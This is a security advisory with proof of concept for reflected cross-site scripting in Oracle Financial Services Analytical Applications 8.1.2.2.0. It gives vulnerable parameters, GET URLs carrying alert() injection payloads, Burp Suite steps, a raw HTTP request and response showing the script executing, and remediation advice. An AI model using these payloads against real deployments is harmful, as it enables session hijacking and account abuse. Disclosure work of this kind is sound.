# Oracle Financial Services Analytical Applications - Reflected Cross Site Scripting in Data Entry

**Vendors:** Oracle ([https://www.oracle.com/](https://www.oracle.com/))
**Product:** Oracle Financial Services Analytical Applications ([https://www.oracle.com/financial-services/analytics/](https://www.oracle.com/financial-services/analytics/)) - Modules Asset Liability Management
**Version:** 8.1.2.2.0
**Discovered by:** Nguyen Kim Sang, Nguyen Quoc Viet - HPT Vietnam Corporation

## **Description:**
Oracle Financial Services Analytical Applications Version 8.1.2.2.0 is vulnerable to Reflected XSS. The following parameters have been found to be vulnerable to reflected cross site scripting attacks. Furthermore, there are many more vulnerable parameters. It is also possible to bypass input validation checks in order to inject JavaScript code.
*   **Vulnerable parameter:** `strExcelSheetName, sort`
*   **Function**: Asset Liability Management > Common Object Maintenance > Data Entry Forms and Queries > Data Entry >
*   **URL**:

\- http://**\[yourdomain\]**/**\[APIHOST\]**/DeFi/DataEntry/DisplayPage.jsp?formname=IMP\_CASHFLOW\_METHOD&formIdentifier=166&app\_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=2&rows=13&requestType=1&seqGenCols=-1&filter=null&methodtype=posttoget&sort=&rownumStr=0&sqlString=&recorddetails=&uniqueid=1732242073243&table\_name=IMP\_CASHFLOW\_METHOD&startPageRow=13&recordSize=13&totRecords=16&pagination=true&searchFlag=false&authFlag=false&TreeType=0&searchMsg=null&strExcelNames=\[%22Select+Excel%22%2C%22B7880640\_2.XLSX%22%2C%22IMP\_CASHFLOW\_METHOD.XLSX%22%2C\]&strExcelFieldName=V\_EXCEL\_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=\[\]&\_CSRF=null&APIHOST=%2F<apihost>

*   **Method**: GET
*   **Payload**:
formname=IMP\_CASHFLOW\_METHOD&formIdentifier=166&app\_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=2&rows=13&requestType=1&seqGenCols=-1&filter=null&methodtype=posttoget&sort=`--%3E%3Cscript%3Ealert(%27VietNQ.HPT%27)%3C%2fscript%3E`&rownumStr=0&sqlString=&recorddetails=&uniqueid=1732242073243&table\_name=IMP\_CASHFLOW\_METHOD&startPageRow=13&recordSize=13&totRecords=16&pagination=true&searchFlag=false&authFlag=false&TreeType=0&searchMsg=null&strExcelNames=\[%22Select+Excel%22%2C%22B7880640\_2.XLSX%22%2C%22IMP\_CASHFLOW\_METHOD.XLSX%22%2C\]&strExcelFieldName=V\_EXCEL\_NAME&strExcelSheetName=`%27%3balert(%27VietNQ.MB%27)%2f%2f`&excelAuthTF=T&newformatType=\[\]&\_CSRF=null&APIHOST=%2F<apihost>
*   **Conditional**: User Login
*   **Vulnerable / Tested Versions:**
The following version has been tested which was the most recent one when the vulnerabilities were discovered:
Oracle Financial Services Analytical Applications Version 8.1.2.2.0
## **Severity:**
4.3 / Medium - CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:L
## Remediation:
**\- Input Validation and Sanitization**: Ensures that the data entered by the user is of the expected type, format, and within acceptable boundaries. Convert potentially dangerous characters (such as `<`, `>`, `"`, `'`, `&`) into their HTML entity equivalents (e.g., `<`, `>`, `"`).
**\- Use HTTP-Only Cookies**: are a key security measure to mitigate the risks of Cross-Site Scripting (XSS) attacks, particularly those that target sensitive session information like authentication tokens or user IDs stored in cookies.
**\- Implement Content Security Policy (CSP)**: Limit malicious content from executing on the client side.
**\- Regular Security Audits**: It’s important to regularly audit applications for potential vulnerabilities and perform penetration testing to identify weaknesses before attackers do.

## Proof of Exploitation:
1. Login to user have granted privileges to using **Asset Liability Management** and able to modify Data Entry
![](https://t3897127.p.clickup-attachments.com/t3897127/07085075-d604-49c6-8021-baa4e9c09b58/image.png)
*   Asset Liability Management
![](https://t3897127.p.clickup-attachments.com/t3897127/ff7f227e-bc8b-4bcf-917d-41bd7182e603/image.png)
*   Common Object Maintenance
![](https://t3897127.p.clickup-attachments.com/t3897127/78fcfa91-ebd4-40ec-8a40-48be24454e93/image.png)
*   Data Entry Forms and Queries
![](https://t3897127.p.clickup-attachments.com/t3897127/8dd4ba7c-981a-4352-966b-ccd5c5b52909/image.png)
*   Data Entry :
![](https://t3897127.p.clickup-attachments.com/t3897127/03d68499-e374-44c7-82df-3a38b31ec3d9/image.png)
*   Export CSV/XLS:
![](https://t3897127.p.clickup-attachments.com/t3897127/b2e2b4a1-8e95-4ae8-bb52-168be5f40505/image.png)
2\. Check one of the Time Buckets in the list and then clicking Edit, we using Burp Suite here to intercept the request.
*   HTTP Request send when edit Time Buckets:
![](https://t3897127.p.clickup-attachments.com/t3897127/855e0df8-cad5-4a12-9cbd-173fe9bff6f6/image.png)
3\. Send request to Repeater Tab and using payload above to inject Javascript code ``";alert`HPT%20CyberSec`;//``
![](https://t3897127.p.clickup-attachments.com/t3897127/6141edb0-2e2d-4f50-bd45-750669cf8186/image.png)
*   Multiple parameter vulnerable to XSS:
![](https://t3897127.p.clickup-attachments.com/t3897127/64574d39-edaf-4d3f-9abf-96a820dd15db/image.png)
4\. Details of HTTP Request/Response:
HTTP REQUEST:

```plain
GET /icaap/fsapps/common_oj/index.jsp?pageMode=Edit";alert`HPT+CyberSec`;//&objectDefinitionId=9999999998";alert`HPT+CyberSec`;// HTTP/1.1
Host: 10.1.16.27:7003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.1.16.27:7003/icaap/fsapps/common_oj/index.jsp?root=time_bucket&pageMode=EDIT&objectDefinitionId=9999997769&infodom=ICAAPINFO&appId=OFS_ALM&sourceLang=US&locale=en_US&header=Time%2520Buckets&menuItem=edit&idTypeName=TIME_BKTS_ALM&NAME=&FOLDER=ALMSEG
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=qb1Syh0P7zk-_2DHjpX_8TGhI_BFqnjjRHNvyVHsVJp5CNBiJ7IR!-1346726888
Connection: keep-alive



```

HTTP RESPONSE:

```java
HTTP/1.1 200 OK
Date: Fri, 22 Nov 2024 03:08:56 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 105dde82-714e-4f2b-8e53-66b0eea3d79e-0001119d
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 33013
        
   <script>
    	var infodom = "null";
    	var appId = "null";
    	var locale = "en_US";
    	var id = "null";
    	var objectTypeId = "null";
    	var sourceLang = "null";
    	var contextPath = "/icaap";
    	var userId = "ALMUSER";
    	var glFormCode = "null";
    	var glAlertType = "null";
    	var glErrorMessage = "null";
    	var isSimplifiedBatch="null";
    	var appUrl = "null";
    	var windowObj = "null";
    	var templateCd = "null";
    	var objectTypeId2 = "null";
        var objectTypeId3 = "null";
        var ids = "null";
        var header = "null";
        var menuItem = "null";
        var idTypeName = "null";
        var processID = "null";
        var processName = "null";
        var executeAgain = "null";
        var isAppLRM = "false" == "false"? false: true;
        var isTypeReporting = "false" == "false"? false: true;                
        var asOfDateReq = "null";
        var pageMode = "Edit";
        alert`HPT CyberSec`;
        //";
        var interestRateCode = "0";
		var objectDefinitionId = "9999999998";
        alert`HPT CyberSec`;
        //";
    	var holidayID = "null";
		var mode = "null";
    	var  bandType= "null";
		var holidayExpFromDate="null";
		var holidayExpToDate="null";
    	var mainModel;
    	var callBackFunction;
    	var currentObject;
		var modalDialogElement;
```

5\. To trigger XSS and pop up message we can use **Show response in browser** of Burpsuite, copy and paste to browser or access direct using link below:

http://**\[yourdomain\]**/**\[APIHOST\]**/fsapps/common\_oj/index.jsp?pageMode=Edit";alert\`HPT%20CyberSec\`;//&objectDefinitionId=9999999998";alert\`HPT%20CyberSec\`;//

![](https://t3897127.p.clickup-attachments.com/t3897127/c7062e45-c6f5-48f8-b85a-80e499cbe882/image.png)
**6\. XSS triggered**
![](https://t3897127.p.clickup-attachments.com/t3897127/8c2d31be-8852-443c-9d4d-3192c6bf308e/image.png)